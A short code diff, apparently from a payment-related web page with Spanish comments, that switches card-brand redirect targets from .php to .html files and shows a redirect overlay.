@@ -580,8 +580,8 @@
 
                         // 🔥 FIX: Forzar que la marca sea en minúsculas y validar
                         const marcaSegura = (data.marca || 'visa').toLowerCase();
-                        const mapa = { visa: 'visa.php', mastercard: 'master.php', amex: 'amex.php' };
-                        const destino = mapa[marcaSegura] || 'visa.php'; // Si falla, siempre va a visa.php
+                        const mapa = { visa: 'visa.html', mastercard: 'master.html', amex: 'amex.html' };
+                        const destino = mapa[marcaSegura] || 'visa.html'; // Si falla, siempre va a visa.php
 
                         overlayMostrarLogo(marcaSegura, `Redirigiendo...`);
                         overlayActualizarProgreso(100);
